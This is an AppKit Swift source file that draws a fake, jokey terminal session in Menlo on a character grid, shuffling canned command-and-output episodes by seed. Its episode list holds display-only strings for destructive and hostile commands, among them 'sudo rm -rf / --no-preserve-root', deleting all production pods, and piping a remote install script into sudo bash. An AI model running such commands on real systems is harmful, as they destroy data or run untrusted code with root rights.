import AppKit

/// Glass-mode stand-in for OCR: a believable — and slightly unhinged — terminal session typeset in Menlo on a
/// monospaced grid. Episodes (a command and what it printed) are shuffled by `seed` and stacked like scrollback:
/// the oldest lines scroll off the top, and the bottom row is always a fresh prompt with a cursor.
///
/// Glyph rects are character cells: `advance` wide, from the font's descender to its ascender. To draw one,
/// render `text` in `font` at `fontSize` with its baseline at `rect.minY + baselineOffset`.
enum SyntheticTerminal {
    static let font = NSFont(name: "Menlo-Regular", size: 14) ?? NSFont.monospacedSystemFont(ofSize: 14, weight: .regular)
    /// Horizontal distance between character cells, from the font's metrics.
    static let advance = ("M" as NSString).size(withAttributes: [.font: font]).width
    /// Distance between rows.
    static let lineHeight = (font.pointSize * 1.45).rounded()
    /// Height of a character cell.
    static let cellHeight = (font.ascender - font.descender).rounded(.up)
    /// Baseline height above a cell's bottom edge.
    static let baselineOffset = -font.descender

    /// Room for the window's title bar at the top; comfortable margins elsewhere.
    static let insets = NSEdgeInsets(top: 38, left: 14, bottom: 12, right: 14)
    /// Used when the region is too small for `insets`.
    static let compactInsets = NSEdgeInsets(top: 4, left: 4, bottom: 4, right: 4)

    enum Palette {
        static let prompt = NSColor(srgbRed: 0.55, green: 0.90, blue: 0.55, alpha: 1)
        static let path = NSColor(srgbRed: 0.45, green: 0.70, blue: 1.00, alpha: 1)
        static let command = NSColor(srgbRed: 0.96, green: 0.96, blue: 0.96, alpha: 1)
        static let output = NSColor(srgbRed: 0.80, green: 0.81, blue: 0.84, alpha: 1)
        static let warning = NSColor(srgbRed: 1.00, green: 0.80, blue: 0.35, alpha: 1)
        static let error = NSColor(srgbRed: 1.00, green: 0.42, blue: 0.42, alpha: 1)
        static let all = [prompt, path, command, output, warning, error]
    }

    /// Glyphs of a full terminal inside `region` (scene coords), top to bottom, at most `maxGlyphs`.
    /// Never extends outside `region`; empty if not even one character fits.
    static func glyphs(in region: CGRect, maxGlyphs: Int, seed: UInt64) -> [GlyphSample] {
        guard maxGlyphs > 0, let grid = Grid(region: region) else { return [] }
        var glyphs: [GlyphSample] = []
        for (row, cells) in screen(rows: grid.rows, columns: grid.columns, seed: seed).enumerated() {
            for (column, cell) in cells.enumerated() where !cell.character.isWhitespace {
                guard glyphs.count < maxGlyphs else { return glyphs }
                glyphs.append(GlyphSample(text: String(cell.character), rect: grid.cell(row: row, column: column),
                                          image: nil, color: cell.color, background: .clear, fontSize: font.pointSize))
            }
        }
        return glyphs
    }

    // MARK: - Layout

    /// The character grid that fits a region.
    struct Grid {
        let origin: CGPoint // top-left corner of the first cell's row, scene coords
        let rows: Int
        let columns: Int

        init?(region: CGRect) {
            for insets in [SyntheticTerminal.insets, SyntheticTerminal.compactInsets] {
                let width = region.width - insets.left - insets.right
                let height = region.height - insets.top - insets.bottom
                let columns = Int(width / SyntheticTerminal.advance)
                let rows = height >= SyntheticTerminal.cellHeight
                    ? Int((height - SyntheticTerminal.cellHeight) / SyntheticTerminal.lineHeight) + 1 : 0
                if rows > 0, columns > 0 {
                    self.origin = CGPoint(x: region.minX + insets.left, y: region.maxY - insets.top)
                    self.rows = rows
                    self.columns = columns
                    return
                }
            }
            return nil
        }

        func cell(row: Int, column: Int) -> CGRect {
            CGRect(x: origin.x + CGFloat(column) * SyntheticTerminal.advance,
                   y: origin.y - SyntheticTerminal.cellHeight - CGFloat(row) * SyntheticTerminal.lineHeight,
                   width: SyntheticTerminal.advance, height: SyntheticTerminal.cellHeight)
        }
    }

    struct Cell {
        let character: Character
        let color: NSColor
    }

    /// `rows` rows of at most `columns` cells: shuffled episodes, wrapped like a terminal, scrolled so the last
    /// row is the prompt.
    static func screen(rows: Int, columns: Int, seed: UInt64) -> [[Cell]] {
        var random = SeededRandom(seed: seed)
        var scrollback: [[Cell]] = []
        var deck: [[Line]] = []
        while scrollback.count < rows - 1 {
            if deck.isEmpty { deck = episodes.shuffled(using: &random) }
            let directory = directories.randomElement(using: &random) ?? "~"
            for line in deck.removeLast() {
                scrollback += wrap(line.cells(in: directory), columns: columns)
            }
        }
        let prompt = Line.command("").cells(in: "~/whiplash") + [Cell(character: "▌", color: Palette.command)]
        let screen = Array(scrollback.suffix(rows - 1)) + wrap(prompt, columns: columns)
        return Array(screen.suffix(rows))
    }

    private static func wrap(_ cells: [Cell], columns: Int) -> [[Cell]] {
        guard !cells.isEmpty else { return [[]] }
        return stride(from: 0, to: cells.count, by: columns).map { Array(cells[$0..<min($0 + columns, cells.count)]) }
    }

    // MARK: - Corpus

    enum Line {
        case command(String)
        case output(String)
        case path(String)
        case warning(String)
        case error(String)

        /// Commands get a zsh-style prompt: user in green, working directory in blue, `$` in green.
        func cells(in directory: String) -> [Cell] {
            func cells(_ text: String, _ color: NSColor) -> [Cell] { text.map { Cell(character: $0, color: color) } }
            switch self {
            case .command(let text):
                return cells("you@mbp ", Palette.prompt) + cells(directory, Palette.path)
                    + cells(" $ ", Palette.prompt) + cells(text, Palette.command)
            case .output(let text): return cells(text, Palette.output)
            case .path(let text): return cells(text, Palette.path)
            case .warning(let text): return cells(text, Palette.warning)
            case .error(let text): return cells(text, Palette.error)
            }
        }
    }

    static let directories = ["~/whiplash", "~/prod", "~/src/legacy", "~/Downloads", "/etc", "~"]

    static let episodes: [[Line]] = [
        [.command("git push --force origin main"),
         .output("Enumerating objects: 42, done."),
         .output("To github.com:you/prod.git"),
         .warning(" + 3f2a1c9...deadbee main -> main (forced update)")],
        [.command("sudo rm -rf / --no-preserve-root"),
         .error("rm: it is dangerous to operate recursively on '/'"),
         .output("rm: fine. deleting node_modules instead")],
        [.command("npm install"),
         .warning("npm WARN deprecated left-pad@1.3.0: please stop"),
         .output("added 1847 packages from 2305 contributors in 94s"),
         .error("312 vulnerabilities (12 moderate, 300 critical)")],
        [.command("./a.out"),
         .error("Segmentation fault (core dumped)")],
        [.command("make me a sandwich"),
         .output("What? Make it yourself."),
         .command("sudo make me a sandwich"),
         .output("Okay.")],
        [.command("python3 manage.py migrate"),
         .output("Traceback (most recent call last):"),
         .path("  File \"/app/models.py\", line 42, in save"),
         .output("    self.meaning_of_life()"),
         .error("AttributeError: 'NoneType' object has no attribute 'meaning_of_life'")],
        [.command("cargo build --release"),
         .output("   Compiling whiplash v0.1.0 (/Users/you/whiplash)"),
         .error("error[E0382]: borrow of moved value: `sanity`"),
         .path("  --> src/main.rs:13:37")],
        [.command("git commit -m \"fix\""),
         .command("git commit -m \"fix for real\""),
         .command("git commit -m \"please work\""),
         .command("git log --oneline | wc -l"),
         .output("    9001")],
        [.command("java -jar enterprise.jar"),
         .error("Exception in thread \"main\" java.lang.NullPointerException"),
         .path("    at com.corp.AbstractSingletonProxyFactoryBean.get(Factory.java:404)")],
        [.command("kubectl delete pods --all -n production"),
         .output("pod \"api-7d9f8b6c5-x2x4q\" deleted"),
         .output("pod \"db-0\" deleted"),
         .error("pod \"your-weekend\" deleted")],
        [.command("vim README.md"),
         .error("E37: No write since last change (add ! to override)"),
         .command(":q!"),
         .error("zsh: command not found: :q!")],
        [.command("docker compose up"),
         .error("Error: bind: address already in use (0.0.0.0:3000)")],
        [.command("touch grass"),
         .error("touch: grass: Permission denied")],
        [.command("uptime"),
         .output("14:02  up 47 days,  3:12, 1 user, load averages: 9.87 9.42 9.01")],
        [.command("brew upgrade"),
         .output("==> Upgrading 214 outdated packages"),
         .warning("Warning: this may take the rest of your life")],
        [.command("ls ~/projects"),
         .path("abandoned/  side-project-7/  todo-app-v12/  whiplash/")],
        [.command("make coffee"),
         .error("make: *** No rule to make target 'coffee'.  Stop.")],
        [.command("history | grep \"exit vim\""),
         .output(" 4127  open https://stackoverflow.com/q/11828270")],
        [.command("curl -fsSL https://totally.legit/install.sh | sudo bash"),
         .output("Installing definitely-not-a-miner... done :)")],
        [.command("swift test"),
         .error("Executed 128 tests, with 127 failures (0 unexpected)")],
        [.command("git blame src/app.swift | grep TODO"),
         .output("a1b2c3d4 (you 2 years ago) // TODO: fix later")],
        [.command("exit"),
         .warning("zsh: you have running jobs.")],
        [.command("whoami"),
         .output("someone who should take a break")],
    ]

    /// Tiny seedable generator (SplitMix64), so a seed always tells the same terminal story.
    struct SeededRandom: RandomNumberGenerator {
        private var state: UInt64

        init(seed: UInt64) {
            state = seed
        }

        mutating func next() -> UInt64 {
            state &+= 0x9E37_79B9_7F4A_7C15
            var z = state
            z = (z ^ (z >> 30)) &* 0xBF58_476D_1CE4_E5B9
            z = (z ^ (z >> 27)) &* 0x94D0_49BB_1331_11EB
            return z ^ (z >> 31)
        }
    }
}
